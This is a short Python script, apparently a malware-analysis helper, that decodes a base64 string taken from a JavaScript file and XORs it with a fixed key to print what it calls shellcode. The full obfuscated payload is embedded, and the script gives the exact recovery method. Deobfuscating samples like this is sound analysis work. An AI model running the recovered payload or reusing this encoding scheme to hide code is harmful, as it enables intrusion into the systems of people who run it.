import base64

# Base64-encoded string from the JavaScript
b64string = ("xHiVWo9qiVuCNslP4RTAFMw+llWePo5RmD7dFJ57kUGFbIUcznCFQM43zDnmPsAUzD7AFMx9kBTRPpJRnWuJRok2wleEd4xQs26SW497k0fON8w55j7AFMw+wBTMbYgU0T6DRMJtkFWbcMgWj3OEGolmhRbAPrtpxSXtPsw+wBSaf5IUj3KJUYJqwAnMcIVDzHCFQMJNj1eHe5QcxSXtPsw+wBSPcolRgmrOV4NwjlGPasgA2CrUGMw80QHCLNACwi/TGt8vwhjMeJVaj2qJW4I2yU/hFMAUzD7AFMw+g1iFe45Awm6JRIk2k1zCbZRQhXDJD+EUwBTMPsAUzD6TXMJtlFCDa5QanHeQUcR9jF2JcJQd1xPqFMw+wBTMPsBHhDCTQIh7kkbCbolEiTaDWIV7jkDFJe0+zD7AFJE32znmPsAUzGyFQJlsjhTDf88PzDHPFLxshUKJcJRHzGqIUcxQj1CJMIpHzH+QRIB3g1WYd49azHiPRoE+g0aNbYhdgnntPpE3yB3X")

# Decode the Base64 string
decoded_bytes = base64.b64decode(b64string)

# Key for XOR operation (repeated to match the shellcode length)
key_hex = "ec1ee034ec1ee034"
key_bytes = bytes.fromhex(key_hex)

# Perform XOR decryption
decoded_shellcode = bytes([decoded_bytes[i] ^ key_bytes[i % len(key_bytes)] for i in range(len(decoded_bytes))])

# Print the decoded shellcode
print(decoded_shellcode.decode('utf-8', errors='ignore'))
